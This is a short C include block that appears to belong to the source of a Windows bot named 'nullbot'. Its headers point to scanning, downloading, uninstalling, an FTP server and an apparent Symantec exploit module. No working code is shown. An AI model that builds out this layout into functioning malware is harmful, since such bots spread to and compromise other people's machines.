#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT	0x0403				// Very important for critical sections.
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <shellapi.h>
#include <mmsystem.h>
#include <time.h>
#include <Lm.h>
#include <winioctl.h>
#include <sqlext.h>
#include <shlwapi.h>
#include <Winnetwk.h>
#include <ctype.h>
#include <lmat.h>
#include <lmremutl.h>
#include <psapi.h>
#include <process.h>
#include <winsvc.h>

//main
#include "defines.h"
#include "nullbot.h"
#include "threads.h"
#include "tcpip.h"
//base
#include "uninstall.h"
#include "other.h"
#include "download.h"
//#include "service.h"
//scanning
#include "advscan.h"
#include "hostcheck.h"
#include "ftpd.h"
#include "symnatec.h"




